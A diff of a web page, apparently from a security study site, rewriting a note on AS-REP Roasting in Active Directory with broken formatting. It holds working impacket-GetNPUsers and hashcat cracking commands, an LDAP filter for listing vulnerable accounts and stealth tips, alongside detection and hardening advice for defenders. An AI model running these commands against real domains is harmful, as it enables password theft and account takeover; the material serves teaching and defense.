 <details class="nav-branch accent-amber"><summary><span class="nb-left"><svg class="nb-ico" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><circle cx="12" cy="12" r="6"/><circle cx="12" cy="12" r="2"/></svg><span class="nb-name">Attack Surface Mapping</span></span><span class="nb-right"><span class="count">11</span><svg class="chev" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="6 9 12 15 18 9"/></svg></span></summary><div class="nav-leaves">
 <a class="nav-leaf nav-leaf-overview" href="../attack-surface-mapping/index.html">Overview</a>
 <a class="nav-leaf" href="../attack-surface-mapping/admin-interface-discovery.html" title="Admin Interface Discovery">Admin Interface Discovery</a>
@@ -226,7 +238,7 @@
 <a class="nav-leaf" href="../linux-privilege-escalation/sudo-misconfigurations.html" title="Sudo Misconfigurations">Sudo Misconfigurations</a>
 <a class="nav-leaf" href="../linux-privilege-escalation/suid-sgid-misconfigurations.html" title="SUID and SGID Misconfigurations">SUID and SGID Misconfigurations</a>
 </div></details>
-<details class="nav-branch accent-slate"><summary><span class="nb-left"><svg class="nb-ico" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M2 3h6a4 4 0 0 1 4 4v14a3 3 0 0 0-3-3H2z"/><path d="M22 3h-6a4 4 0 0 0-4 4v14a3 3 0 0 1 3-3h7z"/></svg><span class="nb-name">Security Playbooks</span></span><span class="nb-right"><span class="count">17</span><svg class="chev" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="6 9 12 15 18 9"/></svg></span></summary><div class="nav-leaves">
+<details class="nav-branch accent-slate"><summary><span class="nb-left"><svg class="nb-ico" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M2 3h6a4 4 0 0 1 4 4v14a3 3 0 0 0-3-3H2z"/><path d="M22 3h-6a4 4 0 0 0-4 4v14a3 3 0 0 1 3-3h7z"/></svg><span class="nb-name">Security Playbooks</span></span><span class="nb-right"><span class="count">18</span><svg class="chev" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="6 9 12 15 18 9"/></svg></span></summary><div class="nav-leaves">
 <a class="nav-leaf nav-leaf-overview" href="../security-playbooks/index.html">Overview</a>
 <a class="nav-leaf" href="../security-playbooks/break-jwt-validation.html" title="Break JWT Validation">Break JWT Validation</a>
 <a class="nav-leaf" href="../security-playbooks/detect-bloodhound-collection.html" title="Detect BloodHound Collection">Detect BloodHound Collection</a>
@@ -235,6 +247,7 @@
 <a class="nav-leaf" href="../security-playbooks/detect-kerberoasting-and-as-rep-roasting.html" title="Detect Kerberoasting and AS-REP Roasting">Detect Kerberoasting and AS-REP Roasting</a>
 <a class="nav-leaf" href="../security-playbooks/exploit-idor.html" title="Exploit IDOR">Exploit IDOR</a>
 <a class="nav-leaf" href="../security-playbooks/exploit-sqli.html" title="Exploit SQL Injection">Exploit SQL Injection</a>
+<a class="nav-leaf" href="../security-playbooks/incident-response-from-signal-to-recovery.html" title="Incident response from signal to recovery">Incident response from signal to recovery</a>
 <a class="nav-leaf" href="../security-playbooks/inspect-file-upload-surface.html" title="Inspect File Upload Surface">Inspect File Upload Surface</a>
 <a class="nav-leaf" href="../security-playbooks/inspect-session-handling.html" title="Inspect Session Handling">Inspect Session Handling</a>
 <a class="nav-leaf" href="../security-playbooks/investigate-ssrf.html" title="Investigate SSRF">Investigate SSRF</a>
@@ -391,7 +404,7 @@
 </div></details>
 </div>
 </div>
-<div class="sidebar-footer"><span>updated · 2026-06-03</span><span class="v">v2026.05</span></div>
+<div class="sidebar-footer"><span>updated · 2026-07-19</span><span class="v">v2026.05</span></div>
 </nav>
 <div class="main-col">
 <header class="topbar">
@@ -412,218 +425,79 @@
 <main class="content">
 <nav class="breadcrumbs" aria-label="Breadcrumb"><a href="../../index.html">Home</a><span>/</span><a href="../index.html">Cybersecurity</a><span>/</span><a href="index.html">Identity &amp; Active Directory</a><span>/</span><span>AS-REP Roasting</span></nav>
 <header class="page-hero">
-<div class="page-meta"><span class="meta-chip">concept</span><span class="meta-chip accent-red">Identity &amp; Active Directory</span><span class="meta-chip meta-time" title="Estimated reading time">~8 min read</span><span class="meta-chip meta-updated" title="Last updated">Updated May 11, 2026</span><span class="meta-chip tag">#cybersecurity</span><span class="meta-chip tag">#offensive-security</span><span class="meta-chip tag">#active-directory</span><span class="meta-chip tag">#kerberos</span><span class="meta-chip tag">#as-rep-roasting</span><span class="meta-chip tag">#credential-attack</span></div>
+<div class="page-meta"><span class="meta-chip">concept</span><span class="meta-chip accent-red">Identity &amp; Active Directory</span><span class="meta-chip meta-time" title="Estimated reading time">~8 min read</span><span class="meta-chip meta-updated" title="Last updated">Updated editorial review needed</span></div>
 </header>
 <article class="article-note">
-<h1 id="as-rep-roasting">AS-REP Roasting</h1>
-<h2 id="definition">Definition</h2>
-<p>AS-REP Roasting is an Active Directory credential attack where an attacker exploits accounts with <strong>Kerberos pre-authentication disabled</strong> by sending an <code>AS-REQ</code> <em>without</em> a pre-auth blob and receiving an <code>AS-REP</code> whose encrypted portion can be cracked offline to recover the target user's password. Unlike <a href="kerberoasting.html">Kerberoasting</a>, <strong>AS-REP Roasting requires no authenticated domain credential</strong> — only knowledge of usernames.</p>
-<h2 id="why-it-matters">Why it matters</h2>
-<p>Kerberoasting needs a valid domain user to start. AS-REP Roasting does not. That single difference makes AS-REP Roasting the canonical <em>pre-foothold</em> AD attack: if an attacker can enumerate usernames (from LinkedIn, leaked credential dumps, anonymous LDAP, OWA email format, public Git commits) and any of those accounts has pre-auth disabled, the attack proceeds without ever logging in.</p>
+<h1>AS-REP Roasting</h1>
+<h2>Definition</h2>
+<p>AS-REP Roasting is an Active Directory credential attack where an attacker exploits accounts with **Kerberos pre-authentication disabled** by sending an `AS-REQ` *without* a pre-auth blob and receiving an `AS-REP` whose encrypted portion can be cracked offline to recover the target user&#x27;s password. Unlike &lt;a href=&quot;kerberoasting.html&quot;&gt;Kerberoasting&lt;/a&gt;, **AS-REP Roasting requires no authenticated domain credential** — only knowledge of usernames.</p>
+<h2>Why it matters</h2>
+<p>Kerberoasting needs a valid domain user to start. AS-REP Roasting does not. That single difference makes AS-REP Roasting the canonical *pre-foothold* AD attack: if an attacker can enumerate usernames (from LinkedIn, leaked credential dumps, anonymous LDAP, OWA email format, public Git commits) and any of those accounts has pre-auth disabled, the attack proceeds without ever logging in.</p>
 <p>The technique matters as a teaching note because it surfaces three things newcomers usually miss:</p>
-<ul>
-<li><strong>Kerberos pre-authentication is a security control, not a protocol formality.</strong> Disabling it sounds like "small configuration choice" and is in fact "give me your password hash, no questions asked".</li>
-<li><strong><code>userAccountControl</code> flags are an attack surface.</strong> The <code>DONT_REQ_PREAUTH</code> flag (<code>UF_DONT_REQUIRE_PREAUTH</code>, value <code>0x400000</code>) is checkable from any authenticated LDAP query and, when present, defines the target list.</li>
-<li><strong>Pre-auth-disabled accounts almost always exist in old environments.</strong> Originally added for MIT/Heimdal Kerberos integration, legacy UNIX systems, and pre-Win2003 apps. The flag persists across decades because nobody audits <code>userAccountControl</code> regularly.</li>
-</ul>
-<h2 id="how-it-works">How it works</h2>
-<p>AS-REP Roasting reduces to <strong>5 protocol steps</strong>:</p>
-<ol>
-<li><strong>Enumerate usernames.</strong> From LinkedIn / OWA email format / leaked breaches / public Git commits / kerbrute brute-force. No authenticated context needed — username enumeration against Kerberos via timing differentials on <code>KRB-ERROR</code> responses works pre-auth.</li>
-<li><strong>Send <code>AS-REQ</code> without pre-authentication.</strong> Normal Kerberos clients include <code>PA-ENC-TIMESTAMP</code> (an encrypted timestamp proving you know the password) inside the <code>AS-REQ</code>. The attacker omits it.</li>
-<li><strong>Receive the KDC's response.</strong>
-   - If the target account requires pre-auth (the default): KDC returns <code>KRB5KDC_ERR_PREAUTH_REQUIRED</code>. Not vulnerable. Move on.
-   - If the target account has <code>DONT_REQ_PREAUTH</code> set: KDC returns an <code>AS-REP</code> whose <code>EncPart</code> is encrypted with the <em>target user's</em> password-derived long-term key.</li>
-<li><strong>Extract the encrypted blob.</strong> Tools like <code>GetNPUsers.py</code> (Impacket) and <code>Rubeus.exe asreproast</code> automate this and emit a hashcat-compatible string in the form <code>$krb5asrep$23$user@DOMAIN:hex:hex</code>.</li>
-<li><strong>Crack offline.</strong> Hashcat mode <code>18200</code> for RC4-HMAC AS-REP, or <code>33100</code> for AES variants. Same offline-cracking economics as Kerberoasting: weak password + RC4 = minutes, strong password + AES-256 = years.</li>
-</ol>
+<ul><li>**Kerberos pre-authentication is a security control, not a protocol formality.** Disabling it sounds like &quot;small configuration choice&quot; and is in fact &quot;give me your password hash, no questions asked&quot;.</li><li>**`userAccountControl` flags are an attack surface.** The `DONT_REQ_PREAUTH` flag (`UF_DONT_REQUIRE_PREAUTH`, value `0x400000`) is checkable from any authenticated LDAP query and, when present, defines the target list.</li><li>**Pre-auth-disabled accounts almost always exist in old environments.** Originally added for MIT/Heimdal Kerberos integration, legacy UNIX systems, and pre-Win2003 apps. The flag persists across decades because nobody audits `userAccountControl` regularly.</li></ul>
+<h2>How it works</h2>
+<p>AS-REP Roasting reduces to **5 protocol steps**:</p>
+<p>1. **Enumerate usernames.** From LinkedIn / OWA email format / leaked breaches / public Git commits / kerbrute brute-force. No authenticated context needed — username enumeration against Kerberos via timing differentials on `KRB-ERROR` responses works pre-auth. 2. **Send `AS-REQ` without pre-authentication.** Normal Kerberos clients include `PA-ENC-TIMESTAMP` (an encrypted timestamp proving you know the password) inside the `AS-REQ`. The attacker omits it. 3. **Receive the KDC&#x27;s response.**    - If the target account requires pre-auth (the default): KDC returns `KRB5KDC_ERR_PREAUTH_REQUIRED`. Not vulnerable. Move on.    - If the target account has `DONT_REQ_PREAUTH` set: KDC returns an `AS-REP` whose `EncPart` is encrypted with the *target user&#x27;s* password-derived long-term key. 4. **Extract the encrypted blob.** Tools like `GetNPUsers.py` (Impacket) and `Rubeus.exe asreproast` automate this and emit a hashcat-compatible string in the form `$krb5asrep$23$user@DOMAIN:hex:hex`. 5. **Crack offline.** Hashcat mode `18200` for RC4-HMAC AS-REP, or `33100` for AES variants. Same offline-cracking economics as Kerberoasting: weak password + RC4 = minutes, strong password + AES-256 = years.</p>
 <p>A representative end-to-end sequence:</p>
-<div class="codehilite"><pre><span></span><code><span class="c1"># From any host, no domain credential required.</span>
-impacket-GetNPUsers<span class="w"> </span>DOMAIN.LOCAL/<span class="w"> </span>-dc-ip<span class="w"> </span><span class="m">10</span>.0.0.1<span class="w"> </span><span class="se">\</span>
-<span class="w">    </span>-usersfile<span class="w"> </span>users.txt<span class="w"> </span>-no-pass<span class="w"> </span>-format<span class="w"> </span>hashcat<span class="w"> </span>-outputfile<span class="w"> </span>asrep.hash
-hashcat<span class="w"> </span>-m<span class="w"> </span><span class="m">18200</span><span class="w"> </span>asrep.hash<span class="w"> </span>/usr/share/wordlists/rockyou.txt<span class="w"> </span>--force
-</code></pre></div>
-
-<p>The bug is not "Kerberos is broken"; it is <em>an account flag turned off the cryptographic proof-of-password gate, so the KDC happily emits a crackable hash of the user's password to any caller who asks for it</em>.</p>
-<h2 id="techniques-patterns">Techniques / patterns</h2>
-<ul>
-<li><strong>Username enumeration is the prerequisite.</strong> Without a username list there is nothing to roast. Build the list from: <code>kerbrute userenum</code>, <code>MSF auxiliary/gather/kerberos_enumusers</code>, OSINT (LinkedIn → first.last@corp.com), public breach corpora, anonymous SMB/RPC enumeration if open.</li>
-<li><strong>If you have <em>any</em> domain credential, dump the target list via LDAP.</strong> With even one valid user, query AD for <code>(userAccountControl:1.2.840.113556.1.4.803:=4194304)</code> — the bitmask filter for the <code>DONT_REQ_PREAUTH</code> flag. Returns every vulnerable account in one query.</li>
-<li><strong>Pick RC4 over AES whenever the KDC offers it.</strong> Same trick as Kerberoasting — <code>GetNPUsers.py</code> defaults to <code>-format hashcat</code> which produces an RC4-HMAC hash when the account supports it. RC4 + weak password = orders of magnitude faster offline crack.</li>
-<li><strong>Cross-check against breach corpora.</strong> Once you have a target list of pre-auth-disabled accounts, run their usernames against haveibeenpwned-style corpora <em>before</em> cracking. Many service accounts and forgotten legacy users reuse known-leaked passwords.</li>
-<li><strong>OPSEC: ask once, not many times.</strong> Bulk-querying every account in the domain leaves a clear telemetry trail (many AS-REQ from one source, all without pre-auth). Senior usage queries only the pre-identified vulnerable accounts.</li>
-</ul>
-<h2 id="variants-and-bypasses">Variants and bypasses</h2>
-<p>AS-REP Roasting has <strong>3 variants</strong> worth distinguishing.</p>
-<h3 id="1-classic-as-rep-roasting-no-creds">1. Classic AS-REP Roasting (no creds)</h3>
-<p>The flow described above. The attacker has zero domain authentication. Requires usernames + at least one account with <code>DONT_REQ_PREAUTH</code>. The variant that makes this attack uniquely dangerous compared to Kerberoasting.</p>
-<h3 id="2-credentialed-as-rep-roasting">2. Credentialed AS-REP Roasting</h3>
+<p>``` # From any host, no domain credential required. impacket-GetNPUsers DOMAIN.LOCAL/ -dc-ip 10.0.0.1 \     -usersfile users.txt -no-pass -format hashcat -outputfile asrep.hash hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt --force ```</p>
+<p>The bug is not &quot;Kerberos is broken&quot;; it is *an account flag turned off the cryptographic proof-of-password gate, so the KDC happily emits a crackable hash of the user&#x27;s password to any caller who asks for it*.</p>
+<h2>Techniques / patterns</h2>
+<ul><li>**Username enumeration is the prerequisite.** Without a username list there is nothing to roast. Build the list from: `kerbrute userenum`, `MSF auxiliary/gather/kerberos_enumusers`, OSINT (LinkedIn → first.last@corp.com), public breach corpora, anonymous SMB/RPC enumeration if open.</li><li>**If you have *any* domain credential, dump the target list via LDAP.** With even one valid user, query AD for `(userAccountControl:1.2.840.113556.1.4.803:=4194304)` — the bitmask filter for the `DONT_REQ_PREAUTH` flag. Returns every vulnerable account in one query.</li><li>**Pick RC4 over AES whenever the KDC offers it.** Same trick as Kerberoasting — `GetNPUsers.py` defaults to `-format hashcat` which produces an RC4-HMAC hash when the account supports it. RC4 + weak password = orders of magnitude faster offline crack.</li><li>**Cross-check against breach corpora.** Once you have a target list of pre-auth-disabled accounts, run their usernames against haveibeenpwned-style corpora *before* cracking. Many service accounts and forgotten legacy users reuse known-leaked passwords.</li><li>**OPSEC: ask once, not many times.** Bulk-querying every account in the domain leaves a clear telemetry trail (many AS-REQ from one source, all without pre-auth). Senior usage queries only the pre-identified vulnerable accounts.</li></ul>
+<h2>Variants and bypasses</h2>
+<p>AS-REP Roasting has **3 variants** worth distinguishing.</p>
+<h3>1. Classic AS-REP Roasting (no creds)</h3>
+<p>The flow described above. The attacker has zero domain authentication. Requires usernames + at least one account with `DONT_REQ_PREAUTH`. The variant that makes this attack uniquely dangerous compared to Kerberoasting.</p>
+<h3>2. Credentialed AS-REP Roasting</h3>
 <p>The attacker already has any valid domain credential. Uses authenticated LDAP to enumerate the exact set of pre-auth-disabled accounts (no guessing, no kerbrute), then runs the protocol against just those. Quieter, more reliable, and lets you skip the username-enumeration noise.</p>
-<h3 id="3-targeted-single-user-as-rep-roasting">3. Targeted (single-user) AS-REP Roasting</h3>
-<p>Pre-identified single high-value target (e.g., a known legacy admin account from leaked org chart). Single <code>AS-REQ</code> produces single <code>AS-REP</code>. Minimal telemetry; lowest detection signal. The variant for engagement-style operators where stealth matters.</p>
-<h2 id="impact">Impact</h2>
+<h3>3. Targeted (single-user) AS-REP Roasting</h3>
+<p>Pre-identified single high-value target (e.g., a known legacy admin account from leaked org chart). Single `AS-REQ` produces single `AS-REP`. Minimal telemetry; lowest detection signal. The variant for engagement-style operators where stealth matters.</p>
+<h2>Impact</h2>
 <p>Ordered by typical real-world severity:</p>
-<ul>
-<li><strong>Foothold from zero authentication.</strong> The defining property. A single pre-auth-disabled account turns a "we know the company name and a few emails" position into "we have a crackable password hash". This is rare for any other AD attack.</li>
-<li><strong>Privilege escalation if the disabled-pre-auth account is privileged.</strong> Pre-auth was historically disabled on UNIX-integration service accounts and on some admin accounts. Cracking yields direct privileged access.</li>
-<li><strong>Persistence and pivot.</strong> Recovered password works for SMB, WinRM, RDP, MSSQL — any service that trusts AD identity. Lateral movement follows immediately.</li>
-<li><strong>Domain context for further attacks.</strong> Even an unprivileged crack establishes a real domain credential, unlocking the full Kerberoasting / BloodHound / SMB enumeration toolkit.</li>
-<li><strong>Forgotten accounts persist for years.</strong> The most common real-world finding: a 2009-era account with pre-auth disabled because of a UNIX integration that was decommissioned in 2013 and never re-secured.</li>
-</ul>
-<h2 id="detection-and-defense">Detection and defense</h2>
+<ul><li>**Foothold from zero authentication.** The defining property. A single pre-auth-disabled account turns a &quot;we know the company name and a few emails&quot; position into &quot;we have a crackable password hash&quot;. This is rare for any other AD attack.</li><li>**Privilege escalation if the disabled-pre-auth account is privileged.** Pre-auth was historically disabled on UNIX-integration service accounts and on some admin accounts. Cracking yields direct privileged access.</li><li>**Persistence and pivot.** Recovered password works for SMB, WinRM, RDP, MSSQL — any service that trusts AD identity. Lateral movement follows immediately.</li><li>**Domain context for further attacks.** Even an unprivileged crack establishes a real domain credential, unlocking the full Kerberoasting / BloodHound / SMB enumeration toolkit.</li><li>**Forgotten accounts persist for years.** The most common real-world finding: a 2009-era account with pre-auth disabled because of a UNIX integration that was decommissioned in 2013 and never re-secured.</li></ul>
+<h2>Detection and defense</h2>
 <p>Ordered by effectiveness:</p>
-<ol>
-<li>
-<p><strong>Audit and remove <code>DONT_REQ_PREAUTH</code> from every account.</strong>
-   The hard fix. Query AD with <code>(userAccountControl:1.2.840.113556.1.4.803:=4194304)</code> and either re-enable pre-auth or disable the account. Schedule the audit; this is the only durable defense because once the flag is cleared, the attack is structurally impossible.</p>
-</li>
-<li>
-<p><strong>Enforce strong, long, random passwords on any account that must keep pre-auth disabled.</strong>
-   If a legacy integration genuinely requires it, raise the password length and entropy until offline cracking is impractical (25+ random characters). Pair with AES-only encryption types so the cracking economics shift further toward the defender.</p>
-</li>
-<li>
-<p><strong>Behavioral detection on Event ID 4768.</strong>
-   Windows generates Event 4768 (Kerberos Authentication Ticket Request) on every <code>AS-REQ</code>. The detection signal: events with <code>Pre-Authentication Type: 0</code> (PA-ENC-TIMESTAMP not present). On a domain where no account should have pre-auth disabled, <em>any</em> such event is a high-confidence alert. On a domain with one or two legitimate exceptions, baseline those and alert on everything else.</p>
-</li>
-<li>
-<p><strong>Behavioral detection on AS-REQ source diversity.</strong>
-   A single source IP attempting AS-REQ against many usernames (especially in quick succession, or to non-existent usernames) is a textbook AS-REP-roasting signature regardless of pre-auth flags. Pair with <a href="../detection-engineering/behavioral-detection-vs-signature-detection.html">behavioral detection</a> thinking from Phase 2.</p>
-</li>
-<li>
-<p><strong>Username enumeration mitigations.</strong>
-   Kerberos pre-auth itself leaks the existence of usernames via <code>KRB-ERROR</code> codes (different errors for "no such user" vs "wrong password"). Reduce this by setting the lockout-on-failed-auth policy and by treating user-not-found and bad-password the same in the response timing.</p>
-</li>
-<li>
-<p><strong>Honey accounts with <code>DONT_REQ_PREAUTH</code> set.</strong>
-   Plant a fake account with pre-auth disabled and a strong random password that nobody knows. Any <code>AS-REQ</code> against it is an AS-REP-roasting attempt by definition. Asymmetric defense — high-fidelity alert, near-zero false positive.</p>
-</li>
-</ol>
-<h3 id="what-does-not-work-as-a-primary-defense">What does not work as a primary defense</h3>
-<ul>
-<li><strong>Blocking outbound Kerberos.</strong> AS-REP Roasting is performed <em>against</em> the KDC by anyone who can reach it; the defender does not control the attacker's host. Network-level blocks only help on the perimeter.</li>
-<li><strong>Disabling RC4 alone.</strong> If pre-auth is still disabled, AES-encrypted AS-REPs are still issued — just slower to crack. The root defense is the flag, not the algorithm.</li>
-<li><strong>Renaming pre-auth-disabled accounts.</strong> Security by obscurity. LDAP queries return the canonical attribute regardless of display name.</li>
-<li><strong>Trusting "we don't have any pre-auth-disabled accounts" without verifying.</strong> Always confirm with the LDAP bitmask query above; the manual GUI checkbox is unreliable at scale.</li>
-</ul>
-<h2 id="practical-labs">Practical labs</h2>
+<p>1. **Audit and remove `DONT_REQ_PREAUTH` from every account.**    The hard fix. Query AD with `(userAccountControl:1.2.840.113556.1.4.803:=4194304)` and either re-enable pre-auth or disable the account. Schedule the audit; this is the only durable defense because once the flag is cleared, the attack is structurally impossible.</p>
+<p>2. **Enforce strong, long, random passwords on any account that must keep pre-auth disabled.**    If a legacy integration genuinely requires it, raise the password length and entropy until offline cracking is impractical (25+ random characters). Pair with AES-only encryption types so the cracking economics shift further toward the defender.</p>
+<p>3. **Behavioral detection on Event ID 4768.**    Windows generates Event 4768 (Kerberos Authentication Ticket Request) on every `AS-REQ`. The detection signal: events with `Pre-Authentication Type: 0` (PA-ENC-TIMESTAMP not present). On a domain where no account should have pre-auth disabled, *any* such event is a high-confidence alert. On a domain with one or two legitimate exceptions, baseline those and alert on everything else.</p>
+<p>4. **Behavioral detection on AS-REQ source diversity.**    A single source IP attempting AS-REQ against many usernames (especially in quick succession, or to non-existent usernames) is a textbook AS-REP-roasting signature regardless of pre-auth flags. Pair with &lt;a href=&quot;../detection-engineering/behavioral-detection-vs-signature-detection.html&quot;&gt;behavioral detection&lt;/a&gt; thinking from Phase 2.</p>
+<p>5. **Username enumeration mitigations.**    Kerberos pre-auth itself leaks the existence of usernames via `KRB-ERROR` codes (different errors for &quot;no such user&quot; vs &quot;wrong password&quot;). Reduce this by setting the lockout-on-failed-auth policy and by treating user-not-found and bad-password the same in the response timing.</p>
+<p>6. **Honey accounts with `DONT_REQ_PREAUTH` set.**    Plant a fake account with pre-auth disabled and a strong random password that nobody knows. Any `AS-REQ` against it is an AS-REP-roasting attempt by definition. Asymmetric defense — high-fidelity alert, near-zero false positive.</p>
+<h3>What does not work as a primary defense</h3>
+<ul><li>**Blocking outbound Kerberos.** AS-REP Roasting is performed *against* the KDC by anyone who can reach it; the defender does not control the attacker&#x27;s host. Network-level blocks only help on the perimeter.</li><li>**Disabling RC4 alone.** If pre-auth is still disabled, AES-encrypted AS-REPs are still issued — just slower to crack. The root defense is the flag, not the algorithm.</li><li>**Renaming pre-auth-disabled accounts.** Security by obscurity. LDAP queries return the canonical attribute regardless of display name.</li><li>**Trusting &quot;we don&#x27;t have any pre-auth-disabled accounts&quot; without verifying.** Always confirm with the LDAP bitmask query above; the manual GUI checkbox is unreliable at scale.</li></ul>
+<h2>Practical labs</h2>
 <p>Run only against owned lab environments or authorized engagements.</p>
-<div class="codehilite"><pre><span></span><code><span class="c"># Lab 1 — Create a pre-auth-disabled account in a lab AD.</span>
-<span class="nb">New-ADUser</span> <span class="n">-Name</span> <span class="s2">&quot;legacy_user&quot;</span> <span class="n">-SamAccountName</span> <span class="s2">&quot;legacy_user&quot;</span> <span class="p">`</span>
-    <span class="n">-AccountPassword</span> <span class="p">(</span><span class="nb">ConvertTo-SecureString</span> <span class="s2">&quot;Spring2019!&quot;</span> <span class="n">-AsPlainText</span> <span class="n">-Force</span><span class="p">)</span> <span class="p">`</span>
-    <span class="n">-Enabled</span> <span class="nv">$true</span>
-<span class="nb">Set-ADAccountControl</span> <span class="n">-Identity</span> <span class="n">legacy_user</span> <span class="n">-DoesNotRequirePreAuth</span> <span class="nv">$true</span>
-<span class="c"># This account is now AS-REP-roastable from any unauthenticated host on the network.</span>
-</code></pre></div>
-
-<div class="codehilite"><pre><span></span><code><span class="c1"># Lab 2 — Enumerate pre-auth-disabled accounts WITHOUT credentials.</span>
-<span class="c1"># Username list (build from OSINT, kerbrute, leaks).</span>
-cat<span class="w"> </span>&gt;<span class="w"> </span>users.txt<span class="w"> </span><span class="s">&lt;&lt;EOF</span>
-<span class="s">administrator</span>
-<span class="s">legacy_user</span>
-<span class="s">backup_admin</span>
-<span class="s">svc_legacy_unix</span>
-<span class="s">random_user</span>
-<span class="s">EOF</span>
-
-impacket-GetNPUsers<span class="w"> </span>LAB.LOCAL/<span class="w"> </span>-dc-ip<span class="w"> </span><span class="m">10</span>.0.0.1<span class="w"> </span><span class="se">\</span>
-<span class="w">    </span>-usersfile<span class="w"> </span>users.txt<span class="w"> </span>-no-pass<span class="w"> </span>-format<span class="w"> </span>hashcat<span class="w"> </span>-outputfile<span class="w"> </span>asrep.hash
-cat<span class="w"> </span>asrep.hash
-<span class="c1"># Output contains $krb5asrep$23$* lines — one per vulnerable account.</span>
-</code></pre></div>
-
-<div class="codehilite"><pre><span></span><code><span class="c1"># Lab 3 — Enumerate the vulnerable list via authenticated LDAP (if you have any cred).</span>
-impacket-GetNPUsers<span class="w"> </span>LAB.LOCAL/lowpriv:<span class="s1">&#39;Password1&#39;</span><span class="w"> </span>-dc-ip<span class="w"> </span><span class="m">10</span>.0.0.1<span class="w"> </span>-request
-<span class="c1"># This automatically queries LDAP for the flag bitmask and roasts every match.</span>
-</code></pre></div>
-
-<div class="codehilite"><pre><span></span><code><span class="c1"># Lab 4 — Crack offline.</span>
-hashcat<span class="w"> </span>-m<span class="w"> </span><span class="m">18200</span><span class="w"> </span>asrep.hash<span class="w"> </span>/usr/share/wordlists/rockyou.txt<span class="w"> </span>--force
-<span class="c1"># Mode 18200 = AS-REP RC4-HMAC. Use 33100 for AES variants.</span>
-</code></pre></div>
-
-<div class="codehilite"><pre><span></span><code><span class="c"># Lab 5 — Audit your own AD for pre-auth-disabled accounts (defender side).</span>
-<span class="nb">Get-ADUser</span> <span class="n">-Filter</span> <span class="s1">&#39;DoesNotRequirePreAuth -eq $true&#39;</span> <span class="n">-Properties</span> <span class="n">DoesNotRequirePreAuth</span> <span class="p">|</span>
-    <span class="nb">Select-Object</span> <span class="n">SamAccountName</span><span class="p">,</span> <span class="n">Enabled</span><span class="p">,</span> <span class="n">DistinguishedName</span><span class="p">,</span> <span class="n">LastLogonDate</span>
-<span class="c"># Every row is a candidate finding. Either re-enable pre-auth or harden the password.</span>
-</code></pre></div>
-
-<div class="codehilite"><pre><span></span><code><span class="c"># Lab 6 — Validate detection from the defender side.</span>
-<span class="c"># After running the roasting against an authorized lab, check the DC&#39;s Security log:</span>
-<span class="nb">Get-WinEvent</span> <span class="n">-FilterHashtable</span> <span class="p">@{</span><span class="n">LogName</span><span class="p">=</span><span class="s1">&#39;Security&#39;</span><span class="p">;</span> <span class="n">ID</span><span class="p">=</span><span class="n">4768</span><span class="p">}</span> <span class="n">-MaxEvents</span> <span class="n">50</span> <span class="p">|</span>
-    <span class="nb">Where-Object</span> <span class="p">{</span> <span class="nv">$_</span><span class="p">.</span><span class="n">Properties</span><span class="p">[</span><span class="n">10</span><span class="p">].</span><span class="n">Value</span> <span class="o">-eq</span> <span class="s1">&#39;0&#39;</span> <span class="p">}</span>   <span class="c"># PreAuthType = 0</span>
-<span class="c"># Every result is an AS-REP-roasting attempt by definition.</span>
-<span class="c"># Build a SIEM detection rule from this filter.</span>
-</code></pre></div>
-
-<h2 id="practical-examples">Practical examples</h2>
-<ul>
-<li><strong>OSINT-only initial compromise.</strong> Attacker gathers ten employee email addresses from LinkedIn. One of them (<code>legacy_user@corp.com</code>) is a 2011-era account whose owner left the company in 2014. AS-REP roast returns a crackable hash; the password is the user's first name plus their start year. Domain context established without ever interacting with the target as an authenticated user.</li>
-<li><strong>Post-merger forest enumeration.</strong> Newly-merged subsidiary domain has a transitive trust. Attacker (authenticated in parent forest) queries the subsidiary's LDAP, finds 12 accounts with <code>DONT_REQ_PREAUTH</code>, roasts all 12, cracks two with rockyou.txt — pivot into the subsidiary domain follows.</li>
-<li><strong>UNIX-integration ghost account.</strong> Account <code>unix_kdc_proxy</code> was created in 2008 to bridge an MIT Kerberos realm. The realm was decommissioned in 2012. The account remained, with pre-auth disabled and the original password (<code>Welcome123</code>). Recovered in seconds.</li>
-<li><strong>Service account hardening miss.</strong> A defender claims "we have no pre-auth-disabled accounts". LDAP query returns 7. Three are legacy admins. One is in <code>Backup Operators</code>. The audit step took 90 seconds and immediately yields a major finding.</li>
-<li><strong>Honey-account catches red team.</strong> Defender plants <code>svc_legacy_unix2</code> with pre-auth disabled and a 40-character random password. Six months later a red team performs unauthenticated AS-REP roasting from a beachhead; the only account that responds to their queries is the honey account, triggering a high-confidence alert that ends the engagement.</li>
-</ul>
-<h2 id="related-notes">Related notes</h2>
-<ul>
-<li><a href="kerberoasting.html">kerberoasting</a> — the sister attack; same offline-cracking economics, different protocol step, different precondition (needs a credential).</li>
-<li><a href="silver-ticket-and-service-account-persistence.html">silver-ticket-and-service-account-persistence</a> — one downstream use of recovered service-account key material when a roasted account owns SPNs.</li>
-<li><a href="../cryptography/password-hashing.html">Password hashing</a> — the KDF strength is what determines crack cost on both AS-REP and TGS hashes.</li>
-<li><a href="../cryptography/symmetric-encryption-modes.html">Symmetric encryption modes</a> — RC4 vs AES in the Kerberos context.</li>
-<li><a href="../cryptography/kdf-and-key-stretching.html">KDF and key stretching</a> — offline cracking economics 101.</li>
-<li><a href="../foundations/cia-triad-and-what-it-actually-decides.html">CIA triad</a> — AS-REP roasting is primarily an integrity + authenticity breach (impersonation enabled by recovered password).</li>
-<li><a href="../foundations/attacker-defender-duality-as-a-learning-tool.html">Attacker-Defender Duality</a> — pair this note with detection-side counterparts before claiming you understand it.</li>
-<li><a href="../detection-engineering/behavioral-detection-vs-signature-detection.html">Behavioral vs signature detection</a> — the only useful detection framing here.</li>
-<li><a href="../detection-engineering/attack-path-correlation-and-kill-chain-observability.html">Attack path correlation</a> — AS-REP roasting chained with later auth attempts produces high-confidence telemetry.</li>
